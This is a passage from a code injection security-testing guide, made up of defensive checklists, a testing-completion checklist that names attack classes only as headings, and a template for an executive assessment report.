- [ ] Context restriction implementation
- [ ] Expression length limitations

### Command Execution Security:
- [ ] Avoid OS command execution where possible
- [ ] Use parameterized command execution
- [ ] Validate and sanitize command arguments
- [ ] Implement command execution restrictions
- [ ] Regular command execution security reviews
- [ ] Command execution logging
- [ ] Execution environment isolation
- [ ] Privilege separation for commands

### Deserialization Security:
- [ ] Avoid deserialization of untrusted data
- [ ] Use safe serialization formats (JSON, XML)
- [ ] Implement deserialization filters and validators
- [ ] Use type-safe deserialization
- [ ] Regular deserialization security reviews
- [ ] Serialization library updates
- [ ] Deserialization monitoring
- [ ] Gadget chain prevention

### Client-Side Security:
- [ ] Implement Content Security Policy (CSP)
- [ ] Use safe JavaScript practices
- [ ] Validate and sanitize client-side inputs
- [ ] Implement proper output encoding
- [ ] Regular client-side security reviews
- [ ] JavaScript library security updates
- [ ] DOM manipulation security
- [ ] Event handler security

### Monitoring and Logging:
- [ ] Implement code execution logging
- [ ] Monitor for code injection attempts
- [ ] Set up alerts for suspicious patterns
- [ ] Log security policy violations
- [ ] Regular log review and analysis
- [ ] Security incident response procedures
- [ ] Monitoring rule updates
- [ ] Log retention compliance
```

### 16 Code Injection Testing Completion Checklist
```markdown
## ✅ CODE INJECTION VALIDATION TESTING COMPLETION CHECKLIST

### Server-Side Testing:
- [ ] PHP code injection testing completed
- [ ] Java code injection testing done
- [ ] Python code injection testing completed
- [ ] NET code injection testing done
- [ ] Node.js code injection testing completed
- [ ] Ruby code injection testing done
- [ ] Go code injection testing completed
- [ ] Perl code injection testing done

### Template Injection Testing:
- [ ] Jinja2 template injection testing completed
- [ ] Twig template injection testing done
- [ ] Freemarker template injection testing completed
- [ ] Velocity template injection testing done
- [ ] Thymeleaf template injection testing completed
- [ ] Handlebars template injection testing done
- [ ] Smarty template injection testing completed
- [ ] Django template injection testing done

### Expression Language Testing:
- [ ] Spring EL injection testing completed
- [ ] Java UEL injection testing done
- [ ] OGNL expression injection testing completed
- [ ] MVEL expression injection testing done
- [ ] SpEL injection testing completed
- [ ] JBoss EL injection testing done
- [ ] JavaScript expression injection testing completed
- [ ] Python expression injection testing done

### Command Injection Testing:
- [ ] Unix/Linux command injection testing completed
- [ ] Windows command injection testing done
- [ ] Shell command injection testing completed
- [ ] PowerShell injection testing done
- [ ] Command separator testing completed
- [ ] Subshell injection testing done
- [ ] Pipeline injection testing completed
- [ ] Redirection injection testing done

### Deserialization Testing:
- [ ] Java deserialization testing completed
- [ ] NET deserialization testing done
- [ ] Python pickle testing completed
- [ ] PHP deserialization testing done
- [ ] Ruby deserialization testing completed
- [ ] Node.js deserialization testing done
- [ ] YAML deserialization testing completed
- [ ] JSON deserialization testing done

### Client-Side Testing:
- [ ] JavaScript injection testing completed
- [ ] DOM-based code injection testing done
- [ ] Template literal injection testing completed
- [ ] Event handler injection testing done
- [ ] JSONP injection testing completed
- [ ] Dynamic script injection testing done
- [ ] Browser API injection testing completed
- [ ] Web Worker injection testing done

### Advanced Technique Testing:
- [ ] Memory corruption testing completed
- [ ] Buffer overflow testing done
- [ ] Format string testing completed
- [ ] JIT compiler testing done
- [ ] ROP chain testing completed
- [ ] Shellcode injection testing done
- [ ] Memory protection testing completed
- [ ] Advanced evasion testing done

### Defense Bypass Testing:
- [ ] Input validation bypass testing completed
- [ ] Encoding bypass testing done
- [ ] Filter evasion testing completed
- [ ] WAF bypass testing done
- [ ] Sanitization bypass testing completed
- [ ] Blacklist circumvention testing done
- [ ] Whitelist manipulation testing completed
- [ ] Security control testing done
```

### 17 Code Injection Validation Executive Reporting Template
```markdown
# Code Injection Security Assessment Report

## Executive Summary
- **Assessment Scope:** [Code execution components tested]
- **Assessment Period:** [Date range]
- **Code Injection Types Tested:** [Server-side, template, expression, command, etc.]
- **Critical Vulnerabilities:** [Critical code injection findings count]
- **Security Control Gaps:** [Code execution protection deficiencies identified]
- **Overall Risk Level:** [High/Medium/Low]
- **Key Recommendations:** [Priority code security actions]

## Critical Findings
### [Critical Code Injection Finding Title]
- **Component:** [Server-side, template, command, etc.]
- **Risk Level:** Critical
- **Description:** [Detailed code injection vulnerability description]
- **Impact:** [Remote code execution, system compromise, data breach, etc.]
- **Remediation Priority:** Immediate

## Technical Analysis
### Code Execution Assessment
- **Server-Side Code Security:** [Vulnerability count and severity]
- **Template Engine Security:** [Injection protection assessment]
- **Expression Language Security:** [Code execution risk evaluation]
- **Command Execution Security:** [OS command injection analysis]
- **Deserialization Security:** [Object injection risk assessment]

### Protection Mechanism Analysis
- **Input Validation Coverage:** [Validation effectiveness evaluation]
- **Code Execution Restrictions:** [Execution limitation implementation]
- **Sandbox Security:** [Isolation mechanism effectiveness]
- **Security Configuration:** [Framework security settings assessment]
- **Monitoring Capability:** [Code injection detection effectiveness]

## Risk Assessment
### Critical Priority Code Injection Risks
1. **[Code Injection Risk Title]**
   - **Description:** [Detailed code injection risk explanation]
   - **Impact:** [Business impact analysis - system compromise, data loss]
   - **Likelihood:** [Exploitation probability assessment]
   - **Remediation:** [Specific code security mitigation steps]

### High Priority Code Injection Risks
1. **[Code Injection Risk Title]**
   - **Description:** [Detailed code injection risk explanation]
   - **Impact:** [Business impact analysis]
   - **Likelihood:** [Exploitation probability assessment]
   - **Remediation:** [Specific code security mitigation steps]

## Recommendations
### Immediate Actions (1-7 days)
- [ ] [Patch critical code injection vulnerabilities]
- [ ] [Disable dangerous code execution functions]
- [ ] [Implement strict input validation]

### Short-term Improvements (1-4 weeks)
- [ ] [Implement code execution sandboxing]
- [ ] [Add security monitoring for code injection]
- [ ] [Enhance template and expression security]

### Long-term Strategies (1-6 months)
- [ ] [Implement secure coding standards]
- [ ] [Deploy Web Application Firewall with code injection rules]
- [ ] [Establish code security review processes]

## Compliance Status
- **OWASP Compliance:** [OWASP Top 10 code injection security compliance]
- **Regulatory Compliance:** [PCI DSS, GDPR, etc. code execution requirements]
- **Industry Standards:** [Security standards code protection alignment]
- **Internal Policies:** [Code security policy compliance evaluation]

## Security Maturity Assessment
- **Code Security Maturity:** [Maturity level rating]
- **Input Validation Effectiveness:** [Validation implementation assessment]
- **Execution Restriction Implementation:** [Security control evaluation]
- **Monitoring and Detection:** [Detection capability assessment]

## Appendices
### Detailed Code Injection Vulnerability Analysis
- Technical code injection vulnerability descriptions
- Proof-of-concept exploitation details
- Risk impact analysis
- Remediation guidance and references

### Code Injection Testing Methodology
- Code injection testing tools and techniques used
- Testing scope and limitations
- Payload generation methodology
- Quality assurance measures

### Code Security Guidelines
- Secure code execution practices
- Input validation strategies
- Sandbox implementation guidance
- Ongoing code security maintenance
```

This comprehensive Code Injection Validation Testing framework provides complete methodology for identifying, assessing, and mitigating code injection vulnerabilities across web applications and services. The testing approach covers server-side code injection, template injection, expression language injection, command injection, deserialization attacks, client-side code injection, and advanced exploitation techniques to prevent remote code execution, system compromise, data breaches, and complete application takeover through malicious code execution.